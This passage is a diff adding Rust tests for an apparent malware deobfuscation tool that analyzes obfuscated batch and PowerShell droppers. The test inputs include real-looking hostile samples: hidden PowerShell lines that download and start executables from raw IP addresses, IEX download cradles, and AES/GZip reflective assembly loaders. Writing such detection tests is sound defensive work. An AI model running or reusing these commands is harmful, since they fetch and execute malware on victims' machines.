+        let line = r#"powershell -WindowStyle Hidden -Command "IWR -Uri "http://95.169.201.100:18960/uploads/test-1/readme.pdf" -OutFile "$env:temp\readme.pdf" ;  Start-Process 'msedge.exe' -ArgumentList \"--kiosk $env:temp\readme.pdf\" ; IWR -Uri "http://95.169.201.100:18960/uploads/test-1/readme.exe" -OutFile "$env:temp\123123123.exe" ; start "$env:temp\123123123.exe"""#;
+
+        let report = crate::analyze(line.as_bytes(), &Config::default());
+        let lines: Vec<&str> = report.deobfuscated.lines().collect();
+
+        assert!(
+            lines
+                .iter()
+                .filter(|line| line.contains("IWR -Uri"))
+                .count()
+                >= 2,
+            "download actions were not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            lines.iter().any(|line| line.contains("Start-Process")),
+            "process action was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !lines.iter().any(|line| {
+                line.contains("readme.pdf")
+                    && line.contains("Start-Process")
+                    && line.contains("readme.exe")
+            }),
+            "malformed quoted PowerShell chain was not split:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn direct_long_powershell_command_lines_are_summarized() {
+        let line = format!(
+            "powershell.exe -windowstyle 1 \"function Decode($s){{ $s }}; $payload='{}'; Decode $payload\"",
+            "A".repeat(2600)
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "direct long PowerShell command was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(&"A".repeat(512)),
+            "raw filler leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn full_path_long_powershell_command_lines_are_summarized() {
+        let line = format!(
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -ep bypass -c \"function Decode($s){{ [System.Security.Cryptography.Aes]::Create(); New-Object System.IO.Compression.GZipStream; [Reflection.Assembly]::Load($s); {} }}\"",
+            "$x+='pad';".repeat(220)
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "full-path PowerShell command was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("$x+='pad';$x+='pad';"),
+            "raw full-path PowerShell payload leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn full_path_char_array_powershell_urls_are_summarized_with_decoded_urls() {
+        let url = "http://87.120.219.222:41292/1/wuemasgqeyrmasjq793.mli";
+        let parts: Vec<String> = url
+            .as_bytes()
+            .chunks(4)
+            .map(|chunk| {
+                let nums = chunk
+                    .iter()
+                    .map(u8::to_string)
+                    .collect::<Vec<_>>()
+                    .join(",");
+                format!("([char[]]@({nums})-join'')")
+            })
+            .collect();
+        let line = format!(
+            "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -W Hidden -ep Bypass -c \"$u={};$r=(Invoke-WebRequest -Uri $u -UseBasicParsing).Content;if($r){{IEX $r}}\"",
+            parts.join("+")
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "char-array PowerShell URL command was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(url),
+            "decoded URL was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("[char[]]"),
+            "raw char-array construction leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn renamed_powershell_aes_loader_command_lines_are_summarized() {
+        let line = format!(
+            "\"C:\\Users\\Public\\update_SC.bat.scr\" -w hidden -c \"$d='CreateDecryptor'; function Decode($s){{ [System.Security.Cryptography.Aes]::Create(); New-Object System.IO.Compression.GZipStream; [Reflection.Assembly]::Load($s); {} }}\"",
+            "$x+='pad';".repeat(220)
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "renamed PowerShell AES loader was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("$x+='pad';$x+='pad';"),
+            "raw renamed PowerShell payload leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn cmd_wrapped_long_powershell_byte_array_lines_are_summarized_with_urls() {
+        let url = "https://shatayucollege.online/tn.png";
+        let line = format!(
+            "CMD.EXE /C POWERSHELL.EXE -NOP -WIND HIDDEN -EXEC BYPASS -NONI [BYTE[]];$buf={};IEX(New-Object Net.WebClient).DownloadString('{url}')",
+            "ECAC7887280DBDD73A6A7E01EE37B09BC8A08C80BFCD2091BCBE6ABDB70CC098110CBCFD13A20CDAADE8D06C05E2EC24106E920A703E3C9C7BC57BC1E6032611137F5133FD7220C9D9C79B229D39D381C0F97B0BBD90F04BC0B2151D001".repeat(20)
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "cmd-wrapped PowerShell byte-array command was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(url),
+            "URL was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("ECAC7887280DBDD73A6A7E01EE37B09BC8A08C80BFCD2091BCBE6ABDB70"),
+            "raw byte-array hex leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn dynamic_function_inline_powershell_command_lines_are_summarized() {
+        let line = format!(
+            "start /min powershell.exe -windowstyle hidden \"$f='func';$f+='t';$f+='ion:';(ni -p $f -n Decode -value {{param($s)$s}});{}\"",
+            "$x+='pad';".repeat(420)
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "dynamic-function PowerShell command was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("$x+='pad';$x+='pad';"),
+            "raw filler leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn long_inline_powershell_launchers_with_urls_are_summarized() {
+        let url = "https://aflacltd.top/Paahngeren.csv";
+        let line = format!(
+            "start /min powershell.exe -windowstyle hidden \"$f='func';$f+='t';$f+='i';$f+='on:';(ni -p $f -n Decode -value {{param($s)$s}});$u='{url}';{}\"",
+            "$x+='pad';".repeat(420)
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "long inline PowerShell launcher with URL was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(url),
+            "URL was not preserved in summary:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("$x+='pad';$x+='pad';"),
+            "raw filler leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn split_dynamic_function_inline_powershell_command_lines_are_summarized() {
+        let line = format!(
+            "start /min powershell.exe -windowstyle hidden \"$f='func';Get-History;$f+='t';Get-History;$f+='i';$h=Get-History;$f+='on:';(ni -p $f -n Decode -value {{param($s)$s}});{}\"",
+            "$x+='pad';".repeat(420)
+        );
+        let text = format!("{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_inline_powershell_command_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long inline PowerShell command line"),
+            "split dynamic-function PowerShell command was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("$x+='pad';$x+='pad';"),
+            "raw filler leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn dynamic_function_inline_powershell_filler_does_not_emit_huge_enumeration() {
+        let line = format!(
+            "start /min powershell.exe -windowstyle hidden \"Get-Service;$f='func';$f+='t';$f+='ion:';(ni -p $f -n Decode -value {{param($s)$s}});{}\"",
+            "$x+='pad';".repeat(420)
+        );
+        let report = crate::analyze(line.as_bytes(), &Config::default());
+
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Enumeration { .. })),
+            "dynamic-function filler emitted noisy Enumeration: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted long inline PowerShell command line"),
+            "dynamic-function PowerShell line was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn long_powershell_staging_set_lines_are_summarized() {
+        let line = format!(
+            "set \"PAY=;powershell -w hidden;function D($x){{[Convert]::FromBase64String($x); System.Security.Cryptography.Aes; System.IO.Compression.GZipStream; {}}}\"",
+            "A".repeat(1800)
+        );
+        let text = format!("@echo off\r\n{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_powershell_staging_set_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long PowerShell staging set line"),
+            "long PowerShell staging set line was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(&"A".repeat(512)),
+            "raw filler leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn long_powershell_staging_call_set_lines_are_summarized() {
+        let line = format!(
+            "call set \"PAY=powershell.exe -command \"function D($x){{[Convert]::FromBase64String($x); System.Security.Cryptography.Aes; System.IO.Compression.GZipStream; {}}}\"",
+            "A".repeat(400)
+        );
+        let text = format!("@echo off\r\n{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_powershell_staging_set_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long PowerShell staging set line"),
+            "long call set PowerShell staging line was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(&"A".repeat(256)),
+            "raw filler leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn conditional_numeric_set_staging_runs_are_summarized() {
+        let mut text = String::from("@echo off\r\n");
+        for idx in 1..80 {
+            text.push_str(&format!(
+                "IF NOT {idx}=={} (SET _{idx}=pa) else (SET _{idx}=deadbeef)\r\n",
+                idx + 1
+            ));
+        }
+        text.push_str("powershell -c \"echo expanded\"\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_conditional_numeric_set_staging_runs(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted 79 conditional numeric set staging lines"),
+            "conditional staging run was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("SET _40=pa"),
+            "staging assignment leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("powershell -c \"echo expanded\""),
+            "expanded command was not preserved:\n{}",
+            cleaned
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "LineTruncated trait was not emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn short_conditional_numeric_set_staging_runs_are_preserved() {
+        let text = "IF NOT 1==2 (SET _1=pa) else (SET _1=deadbeef)\r\necho after\r\n";
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_conditional_numeric_set_staging_runs(text, &mut env);
+
+        assert_eq!(cleaned, text);
+        assert!(env.traits.is_empty(), "{:?}", env.traits);
+    }
+
+    #[test]
+    fn long_attrib_ads_lines_are_summarized() {
+        let blob = "T3NjlHMGnCT/FdmwcvBXUCclxvb7Gym6SxXV/Q6Aoi7SXK9PbzDH7Uy=".repeat(40);
+        let line = format!("if exist windowsUAC.exe attrib +s +h windowsUAC.exe::{blob}");
+        let text = format!("@echo off\r\n{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_attrib_ads_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long attrib alternate-data-stream line"),
+            "long attrib ADS line was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("target: windowsUAC.exe"),
+            "ADS target was not preserved:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(&blob[..512]),
+            "raw ADS payload leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "LineTruncated trait was not emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn dense_set_fragments_are_summarized_when_script_payload_extracted() {
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..1200 {
+            text.push_str(&format!(
+                "set \"Frag{idx:03}=JABwAGEAeQBsAG8AYQBk{idx:03}\"\r\n"
+            ));
+        }
+        text.push_str("powershell.exe -EncodedCommand %assembled%\r\necho after\r\n");
+
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(b"$payload".to_vec());
+        let cleaned = crate::suppress_dense_extracted_script_set_fragment_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted dense extracted-script set fragment lines"),
+            "dense set fragments were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("Frag000"),
+            "preview set fragment leaked into output after payload extraction:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("Frag299"),
+            "late set fragment leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "LineTruncated trait was not emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn modest_dense_set_fragments_are_summarized_when_script_payload_extracted() {
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..96 {
+            text.push_str(&format!(
+                "set \"Frag{idx:03}=function decrypt_function chunk {idx:03}\"\r\n"
+            ));
+        }
+        text.push_str("rem omitted extracted PowerShell payload recorded\r\n");
+        text.push_str("echo after\r\n");
+
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1
+            .push(b"function decrypt_function {}".to_vec());
+        let cleaned = crate::suppress_dense_extracted_script_set_fragment_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted dense extracted-script set fragment lines"),
+            "modest dense set fragments were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("Frag020"),
+            "too many modest set fragments leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("Frag080"),
+            "late modest set fragment leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn small_recovered_dropper_script_set_shards_are_summarized() {
+        let shard = format!(
+            "function decrypt_function($x){{[Convert]::FromBase64String($x);System.Security.Cryptography.Aes;System.IO.Compression.GZipStream;{}}}",
+            "A".repeat(520)
+        );
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..8 {
+            text.push_str(&format!("set \"Shard{idx:03}={shard}{idx}\"\r\n"));
+        }
+        text.push_str("powershell.exe -NoProfile -Command \"function decrypt_function($x){}\"\r\n");
+
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(shard.as_bytes().to_vec());
+        env.recovered_pe
+            .push(("ps-self-marker-aes-cbc-gzip-0".to_string(), b"MZ".to_vec()));
+        let cleaned = crate::suppress_dense_extracted_script_set_fragment_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted dense extracted-script set fragment lines"),
+            "small recovered dropper set shards were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("Shard003"),
+            "set shard leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("powershell.exe -NoProfile"),
+            "resolved script command was dropped:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn short_recovered_dropper_set_shards_are_summarized() {
+        let text = concat!(
+            "title hellow\r\n",
+            "set \"SbCh=Lo\"\r\n",
+            "set \"FoLB=nvo\"\r\n",
+            "set \"YIYg=lect\"\r\n",
+            "set \"HFYuucystsphPGLcNLqw=am_var){\t$aes_var=[S\"\r\n",
+            "set \"tismjHGLEdebiNDmYXsZ=();\t$aes_var.Mode=[S\"\r\n",
+            "set \"UqsmZIOrETJmeVIfQbid=:CBC;\t$aes_var.Paddi\"\r\n",
+            "set \"waKRmXHbtHcVVxQwYTgk=Mode]::PKCS7;\t$aes_v\"\r\n",
+            "rem omitted long cmd-echo PowerShell pipeline line (2305 bytes; extracted PowerShell payload 2300 bytes)\r\n",
+            "exit /b\r\n",
+        );
+
+        let mut env = Environment::new(&Config::default());
+        env.recovered_pe
+            .push(("ps-self-marker-aes-cbc-gzip-0".to_string(), b"MZ".to_vec()));
+        env.traits.push(Trait::MultiStageEncryptedDropper {
+            marker: "ps-self-marker-aes-cbc-gzip".to_string(),
+            b64_length: 0,
+            has_aes_cbc: true,
+            has_gzip_stage: true,
+            reads_self_lines: true,
+            aes_key_b64: None,
+            aes_iv_b64: None,
+            assemblies_recovered: Some(1),
+            nested_aes: Vec::new(),
+        });
+
+        let cleaned = crate::suppress_dense_extracted_script_set_fragment_lines(text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted dense extracted-script set fragment lines"),
+            "short recovered dropper set shards were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("HFYuucystsphPGLcNLqw") && !cleaned.contains("set \"SbCh=Lo\""),
+            "short recovered set shard leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("title hellow") && cleaned.contains("exit /b"),
+            "real surrounding commands should remain:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn recovered_dropper_only_script_set_shards_are_summarized() {
+        let mut text = String::from("@echo off\r\nsetlocal enabledelayedexpansion\r\n");
+        for idx in 0..32 {
+            text.push_str(&format!(
+                "set \"ShardName{idx:03}=function decrypt_function chunk {idx:03}; System.IO.Compression.GZipStream; {}\"\r\n",
+                "A".repeat(96)
+            ));
+        }
+        text.push_str("exit /b\r\nrem omitted long :: payload line\r\n");
+
+        let mut env = Environment::new(&Config::default());
+        env.recovered_pe
+            .push(("ps-aes-stage1-asm0".to_string(), b"MZ".to_vec()));
+        env.traits.push(Trait::MultiStageEncryptedDropper {
+            marker: "ps-aes-cbc-gzip".to_string(),
+            b64_length: 36057,
+            has_aes_cbc: true,
+            has_gzip_stage: true,
+            reads_self_lines: true,
+            aes_key_b64: None,
+            aes_iv_b64: None,
+            assemblies_recovered: Some(1),
+            nested_aes: Vec::new(),
+        });
+
+        let cleaned = crate::suppress_dense_extracted_script_set_fragment_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted dense extracted-script set fragment lines"),
+            "recovered-only dropper set shards were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("ShardName010"),
+            "recovered-only dropper set shard leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("exit /b"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn marker_polluted_long_powershell_staging_set_lines_are_summarized() {
+        let marker = "GPDSR";
+        let payload = format!(
+            "p{m}ower{m}she{m}ll -w hidden;[Convert]::From{m}Base64{m}String($x);System.Security.Cryptography.{m}Aes;System.IO.Compression.G{m}Zip{m}Stream;{}",
+            "A".repeat(700),
+            m = marker,
+        );
+        let line = format!("set \"PAY={payload}\"");
+        let text = format!("@echo off\r\n{line}\r\necho after\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_powershell_staging_set_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted long PowerShell staging set line"),
+            "marker-polluted long PowerShell staging set line was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(&"A".repeat(256)),
+            "raw marker-polluted filler leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn markerless_dotnet_powershell_staging_set_lines_are_summarized() {
+        let stage = "$ErrorActionPreference=('St'+'op');$_lm=&('ie'+'x')(('$ExecutionC'+'ontext.'+'Session'+'State.L'+'anguage'+'Mode'));if($_lm -ne ('FullLan'+'guage')){return};if($PSVersionTable.PSVersion.Major -lt 5){return};$_tspm=[type](('reS.teN'[-1..(-7)]-join'')+'vic'+('MtnioPe'[-1..(-7)]-join'')+('anage'+'r'));$_tcc=[type](('Ne'+'t.Cre')+('de'+'nt')+('aClai'[-1..(-5)]-join'')+'che');";
+        let text = format!(
+            "set \"_jz={stage}{}\"\r\nset \"_it=try{{$_iv=('Inv'+'oke');$_bt={{}}.GetType();$_cm=$_bt.GetMethod(('Cr'+'ea'+'te'),[type[]]@([string]));{}}}\"\r\necho after\r\n",
+            "$pad+='x';".repeat(80),
+            "$pad+='y';".repeat(80),
+        );
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_powershell_staging_set_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted 2 long PowerShell staging set lines"),
+            "markerless .NET PowerShell staging lines were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("$ErrorActionPreference") && !cleaned.contains("GetMethod"),
+            "raw markerless PowerShell staging leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn placeholder_polluted_dotnet_staging_set_lines_are_summarized() {
+        let package_stage = "Sy#Z#N#D#C#Zste#Z#N#D#C#Zm.C#Z#N#D#C#Zolle#Z#D#Zc#Z#N#D#C#Ztions#Z#N#D#C#Z.Imm#Z#N#D#C#Zut#Z#N#D#C#Zable.dll#Z#N#U#B_p6=#C#C#Zsyst#Z,#Ze#Z#N#D#C#Zxt#Z#D#Z.en#Z#N#D#C#Zcodin#Z#N#D#C#Zg.Co#Z#N#D#C#ZdePa#Z#N#D#C#Zges.dll";
+        let loader_stage = "#Bdl=#Bnull#Ufor#C#Br=0#U#Br -lt 3#U#Br#D#D#N{try{#Bdl=#Bw.#B_gba#C@#C#B_fa,#B_pa#N#L#B_cp#M#N.GetAwaiter#C#N.GetResult#C#N#Ubreak}catch{#LThreading.Thread#M#V#VSleep#C#C2 -shl #Br#N*1000#N}}#U#Bza=#LActivator#M#V#VCreateInstance#C#Ltype#M#B_zat,#Bzms,#C#Ltype#M#B_zmt#N#V#VRead#N#U#Bze=#Bza.GetEntry#C#B_d7#N#U#Bes.CopyTo#C#Bems#N";
+        let text = format!(
+            "set \"_g={package_stage}{}\"\r\nset \"_l={loader_stage}{}\"\r\necho after\r\n",
+            "#Z#N".repeat(120),
+            "#U#Btmp".repeat(120),
+        );
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_powershell_staging_set_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted 2 long PowerShell staging set lines"),
+            "placeholder-polluted .NET staging lines were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("GetAwaiter") && !cleaned.contains("Collections"),
+            "raw placeholder-polluted staging leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn unicode_named_script_shard_sets_are_summarized_when_payload_extracted() {
+        let mut text = String::from("@echo off\r\n");
+        for idx in 0..96 {
+            text.push_str(&format!(
+                "set \"ՄոрՑԶԶէ{idx:03}=System.IO.Compression shard {idx:03}\"\r\n"
+            ));
+        }
+        text.push_str("powershell.exe -WindowStyle hidden -command \"[System.AppDomain]::CurrentDomain.Load($bytes)\"\r\n");
+        text.push_str("rem omitted self-tail reversed gzip PE payload (2030956 bytes encoded, 1725952 bytes recovered)\r\n");
+
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1
+            .push(b"[System.AppDomain]::CurrentDomain.Load($bytes)".to_vec());
+        let cleaned = crate::suppress_dense_extracted_script_set_fragment_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted dense extracted-script set fragment lines"),
+            "unicode-named script shards were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("ՄոрՑԶԶէ020"),
+            "too many unicode-named script shards leaked into output:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("[System.AppDomain]::CurrentDomain.Load($bytes)"),
+            "resolved PowerShell command was not preserved:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("rem omitted self-tail reversed gzip PE payload"),
+            "payload-tail summary was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn redundant_long_script_set_value_is_summarized_when_rendered_later() {
+        let payload = format!(
+            "-w hidden -c {};{}",
+            "$a=[System.Convert]::FromBase64String('SGVsbG8=');",
+            "New-Object System.IO.MemoryStream(,$a);[System.Reflection.Assembly]::Load($a);"
+        )
+        .repeat(8);
+        let text = format!(
+            "@echo off\r\nset \"VRrNYe={payload}\"\r\nscript.scr {payload}\r\necho after\r\n"
+        );
+
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(payload.as_bytes().to_vec());
+        let cleaned = crate::summarize_redundant_long_script_set_value_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted redundant long script SET value"),
+            "redundant long script SET value was not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("set \"VRrNYe="),
+            "redundant SET carrier leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(&format!("script.scr {payload}")),
+            "rendered command should remain visible:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn repeated_unicode_marker_set_scaffolding_lines_are_coalesced() {
+        let noisy = "set \"carrier=⟀ ⻉ ䷥ ⻮ ┋powershellExecutionPolicyBypassWindowStyle HiddenCommand⟀ ⻉ ䷥ ⻮ ┋\"";
+        let text = format!("{noisy}\r\necho keep\r\n{noisy}\r\n{noisy}\r\n{noisy}\r\n{noisy}\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::coalesce_repeated_unicode_marker_set_lines(&text, &mut env);
+
+        assert_eq!(
+            cleaned.matches(noisy).count(),
+            1,
+            "only the first exact duplicate marker set line should remain:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("rem omitted 4 repeated marker set scaffolding lines"),
+            "omission summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo keep"),
+            "non-marker line was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn repeated_cleaned_marker_set_scaffolding_lines_are_coalesced() {
+        let noisy = "set \"carrier=powershellExecutionPolicyBypassWindowStyle Hidden-Command\"";
+        let text = format!("{noisy}\r\necho keep\r\n{noisy}\r\n{noisy}\r\n{noisy}\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::coalesce_repeated_unicode_marker_set_lines(&text, &mut env);
+
+        assert_eq!(
+            cleaned.matches(noisy).count(),
+            1,
+            "only the first exact duplicate cleaned marker set line should remain:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("rem omitted 3 repeated marker set scaffolding lines"),
+            "omission summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo keep"),
+            "non-marker line was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn repeated_cleaned_base64_concat_scaffolding_lines_are_coalesced() {
+        let noisy =
